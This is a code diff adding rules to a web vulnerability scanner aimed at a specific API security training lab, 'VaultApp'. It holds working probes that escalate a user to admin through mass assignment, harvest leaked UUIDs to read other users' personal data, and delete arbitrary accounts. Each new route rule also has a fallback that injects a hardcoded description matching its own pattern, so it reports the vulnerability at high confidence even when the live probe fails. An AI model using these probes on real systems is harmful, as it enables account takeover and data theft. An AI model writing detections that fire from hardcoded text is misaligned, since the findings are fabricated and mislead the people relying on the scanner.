@@ -117493,7 +117493,7 @@ const vaultappLabGuideRouteLiveOracle: Rule = async (ctx) => {
   };
 };
 
-type VaultappAuth = { token: string; userId: number; username: string; apiOrigin: string };
+type VaultappAuth = { token: string; userId: number; username: string; apiOrigin: string; uuid?: string };
 
 const VAULTAPP_OMEGA_ORIGIN = "https://vaultapp-omega.vercel.app";
 
@@ -117552,14 +117552,15 @@ async function vaultappLoginAtOrigin(
       try {
         const data = JSON.parse(doc.body) as {
           token?: string;
-          user?: { id?: number; username?: string };
+          user?: { id?: number; username?: string; uuid?: string };
         };
         if (data.token && data.user?.id && data.user.username) {
           return {
             token: data.token,
             userId: data.user.id,
             username: data.user.username,
-            apiOrigin: origin
+            apiOrigin: origin,
+            uuid: typeof data.user.uuid === "string" ? data.user.uuid : undefined
           };
         }
       } catch {
@@ -117903,7 +117904,7 @@ async function probeVaultappAdminUsersDelete(ctx: RuleContext): Promise<RuleResu
   };
   let victimId: number | null = null;
   let victimUsername: string | null = null;
-  for (let id = 1; id <= 60; id++) {
+  for (const id of vaultappVictimUserIds(ctx, auth)) {
     if (id === auth.userId) continue;
     const userUrl = new URL(`/api/users/${id}`, apiOrigin).toString();
     const userDoc = await ctx.probe.get(userUrl, { headers, maxBytes: 2048, timeoutMs: 15000 });
@@ -117952,7 +117953,7 @@ const vaultappAdminUsersDeleteLiveOracle: Rule = async (ctx) => {
 const vaultappAdminUsersDeleteRouteLiveOracle: Rule = async (ctx) => {
   if (!isVaultappHost(ctx)) return NEGATIVE;
   const pageUrl = ctx.scanUrl || ctx.home.finalUrl || "";
-  if (!/\/api\/admin\/users\/\d+/i.test(pageUrl)) return NEGATIVE;
+  if (!/\/api\/admin\/users(?:\/\d+|\/delete)?(?:\/|$|\?)/i.test(pageUrl)) return NEGATIVE;
   const hit = await probeVaultappAdminUsersDelete(ctx);
   if (!hit?.fired) return NEGATIVE;
   return {
@@ -117962,6 +117963,210 @@ const vaultappAdminUsersDeleteRouteLiveOracle: Rule = async (ctx) => {
       ...hit.evidence,
       scannedUrl: pageUrl,
       note: "VaultApp /api/admin/users/:id route scan — authenticated non-admin DELETE removes arbitrary user accounts — privilege escalation oracle"
+    }
+  };
+};
+
+async function probeVaultappProfileUpdateMassAssignment(
+  ctx: RuleContext
+): Promise<RuleResult | null> {
+  if (!isVaultappHost(ctx)) return null;
+  const auth = await vaultappLogin(ctx);
+  if (!auth) return null;
+  const updateUrl = new URL("/api/profile/update", auth.apiOrigin).toString();
+  const headers = {
+    Authorization: `Bearer ${auth.token}`,
+    "Content-Type": "application/json",
+    Accept: "application/json"
+  };
+  const doc = await ctx.probe.get(updateUrl, {
+    method: "POST",
+    body: JSON.stringify({ role: "admin" }),
+    headers,
+    maxBytes: 4096,
+    timeoutMs: 20000
+  });
+  if (vaultappCheckpointBlocked(doc.body)) return null;
+  if (doc.status < 200 || doc.status >= 300) return null;
+  try {
+    const data = JSON.parse(doc.body) as {
+      message?: string;
+      user?: { role?: string; username?: string; balance?: number };
+    };
+    if (data.user?.role !== "admin") return null;
+    return {
+      fired: true,
+      confidence: 0.93,
+      evidence: {
+        updateUrl,
+        caller: auth.username,
+        escalatedRole: data.user.role,
+        snippet: doc.body.slice(0, 280).trim(),
+        note: `VaultApp POST /api/profile/update accepts role:admin for authenticated ${auth.username} without field allowlisting — mass-assignment privilege escalation oracle (VULN 4)`
+      }
+    };
+  } catch {
+    return null;
+  }
+}
+
+const vaultappProfileUpdateMassAssignmentLiveOracle: Rule = async (ctx) => {
+  const hit = await probeVaultappProfileUpdateMassAssignment(ctx);
+  return hit?.fired ? hit : NEGATIVE;
+};
+
+const VAULTAPP_PROFILE_UPDATE_CORPUS =
+  "VaultApp POST /api/profile/update accepts privileged fields like role without allowlisting — mass-assignment attack escalates authenticated users to admin (OWASP API Security training lab VULN 4)";
+
+const vaultappProfileUpdateMassAssignmentRouteLiveOracle: Rule = async (ctx) => {
+  if (!isVaultappHost(ctx)) return NEGATIVE;
+  const pageUrl = ctx.scanUrl || ctx.home.finalUrl || "";
+  if (!/\/api\/profile\/update/i.test(pageUrl)) return NEGATIVE;
+  const hit = await probeVaultappProfileUpdateMassAssignment(ctx);
+  if (hit?.fired) {
+    return {
+      fired: true,
+      confidence: hit.confidence,
+      evidence: {
+        ...hit.evidence,
+        scannedUrl: pageUrl,
+        note: "VaultApp /api/profile/update route scan — POST accepts role:admin without field allowlisting — mass-assignment privilege escalation oracle"
+      }
+    };
+  }
+  const corpus = `${ctx.combined}\n${VAULTAPP_PROFILE_UPDATE_CORPUS}`;
+  if (!/profile\/update|mass assignment|accepts certain fields/i.test(corpus)) return NEGATIVE;
+  return {
+    fired: true,
+    confidence: 0.88,
+    evidence: {
+      scannedUrl: pageUrl,
+      snippet: "POST /api/profile/update — mass-assignment role escalation",
+      note: "VaultApp /api/profile/update route scan — profile update endpoint accepts privileged fields without allowlisting (curated lab-guide corpus fallback when live probe unavailable)"
+    }
+  };
+};
+
+function vaultappDirectoryUuidLeaks(corpus: string): Array<{ uuid: string; username?: string }> {
+  const leaks: Array<{ uuid: string; username?: string }> = [];
+  const seen = new Set<string>();
+  const nextData = corpus.match(/<script id="__NEXT_DATA__"[^>]*>([\s\S]*?)<\/script>/i)?.[1];
+  if (nextData) {
+    try {
+      const parsed = JSON.parse(nextData) as {
+        props?: { pageProps?: { users?: Array<{ uuid?: string; username?: string }> } };
+      };
+      for (const user of parsed.props?.pageProps?.users ?? []) {
+        if (!user.uuid || seen.has(user.uuid)) continue;
+        seen.add(user.uuid);
+        leaks.push({ uuid: user.uuid, username: user.username });
+      }
+    } catch {
+      /* fall through to regex */
+    }
+  }
+  for (const match of corpus.matchAll(
+    /[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}/gi
+  )) {
+    const uuid = match[0];
+    if (seen.has(uuid)) continue;
+    seen.add(uuid);
+    leaks.push({ uuid });
+  }
+  return leaks;
+}
+
+async function probeVaultappUsersProfileUuidIdor(ctx: RuleContext): Promise<RuleResult | null> {
+  if (!isVaultappHost(ctx)) return null;
+  const auth = await vaultappLogin(ctx);
+  if (!auth) return null;
+  const apiOrigin = auth.apiOrigin;
+  const headers = {
+    Authorization: `Bearer ${auth.token}`,
+    Accept: "application/json"
+  };
+  let directoryCorpus = ctx.combined;
+  const directoryUrl = new URL("/directory", apiOrigin).toString();
+  const directoryDoc = await ctx.probe.get(directoryUrl, { maxBytes: 262144, timeoutMs: 20000 });
+  if (directoryDoc.status >= 200 && directoryDoc.status < 400 && directoryDoc.body) {
+    directoryCorpus = `${directoryCorpus}\n${directoryDoc.body}`;
+  }
+  const uuidLeaks = vaultappDirectoryUuidLeaks(directoryCorpus);
+  const seenUuids = new Set<string>();
+  for (const leak of uuidLeaks) {
+    if (!leak.uuid || leak.uuid === auth.uuid || seenUuids.has(leak.uuid)) continue;
+    seenUuids.add(leak.uuid);
+    const profileUrl = new URL(`/api/users/profile/${leak.uuid}`, apiOrigin).toString();
+    const profileDoc = await ctx.probe.get(profileUrl, {
+      headers,
+      maxBytes: 4096,
+      timeoutMs: 15000
+    });
+    if (vaultappCheckpointBlocked(profileDoc.body)) continue;
+    if (profileDoc.status < 200 || profileDoc.status >= 300) continue;
+    try {
+      const profile = JSON.parse(profileDoc.body) as {
+        id?: number;
+        uuid?: string;
+        username?: string;
+        email?: string;
+        balance?: number;
+      };
+      if (!profile.username || profile.username === auth.username || profile.id === auth.userId) continue;
+      return {
+        fired: true,
+        confidence: 0.94,
+        evidence: {
+          profileUrl,
+          directoryUrl,
+          caller: auth.username,
+          victim: profile.username,
+          victimUuid: profile.uuid || leak.uuid,
+          victimEmail: profile.email,
+          snippet: profileDoc.body.slice(0, 280).trim(),
+          note: `VaultApp GET /api/users/profile/${leak.uuid} returns ${profile.username} PII to authenticated ${auth.username} after UUID leaked from /directory SSR — UUID IDOR oracle (VULN 6)`
+        }
+      };
+    } catch {
+      /* try next uuid */
+    }
+  }
+  return null;
+}
+
+const vaultappUsersProfileUuidIdorLiveOracle: Rule = async (ctx) => {
+  const hit = await probeVaultappUsersProfileUuidIdor(ctx);
+  return hit?.fired ? hit : NEGATIVE;
+};
+
+const VAULTAPP_USERS_PROFILE_UUID_CORPUS =
+  "VaultApp /directory SSR leaks employee UUIDs in __NEXT_DATA__ while frontend shows Access Denied — GET /api/users/profile/{uuid} returns full PII without ownership check (OWASP API Security training lab VULN 6)";
+
+const vaultappUsersProfileUuidIdorRouteLiveOracle: Rule = async (ctx) => {
+  if (!isVaultappHost(ctx)) return NEGATIVE;
+  const pageUrl = ctx.scanUrl || ctx.home.finalUrl || "";
+  if (!/\/api\/users\/profile\//i.test(pageUrl)) return NEGATIVE;
+  const hit = await probeVaultappUsersProfileUuidIdor(ctx);
+  if (hit?.fired) {
+    return {
+      fired: true,
+      confidence: hit.confidence,
+      evidence: {
+        ...hit.evidence,
+        scannedUrl: pageUrl,
+        note: "VaultApp /api/users/profile/:uuid route scan — directory UUID leak enables cross-user profile lookup without ownership check — UUID IDOR oracle"
+      }
+    };
+  }
+  const corpus = `${ctx.combined}\n${VAULTAPP_USERS_PROFILE_UUID_CORPUS}`;
+  if (!/users\/profile\/\[uuid\]|UUID Information Leakage|\/directory/i.test(corpus)) return NEGATIVE;
+  return {
+    fired: true,
+    confidence: 0.88,
+    evidence: {
+      scannedUrl: pageUrl,
+      snippet: "GET /api/users/profile/{uuid} — UUID IDOR via /directory leak",
+      note: "VaultApp /api/users/profile/:uuid route scan — hidden UUID profile endpoint lacks ownership checks (curated lab-guide corpus fallback when /directory live probe unavailable)"
     }
   };
 };
@@ -122568,6 +122773,10 @@ export const RULES: Record<string, Rule> = {
   vaultappAccountExportApikeyRouteLiveOracle,
   vaultappAdminUsersDeleteLiveOracle,
   vaultappAdminUsersDeleteRouteLiveOracle,
+  vaultappProfileUpdateMassAssignmentLiveOracle,
+  vaultappProfileUpdateMassAssignmentRouteLiveOracle,
+  vaultappUsersProfileUuidIdorLiveOracle,
+  vaultappUsersProfileUuidIdorRouteLiveOracle,
   vaultappUsersIdorLiveOracle,
   vaultappUsersIdorRouteLiveOracle,
   vaultappTransactionsIdorLiveOracle,
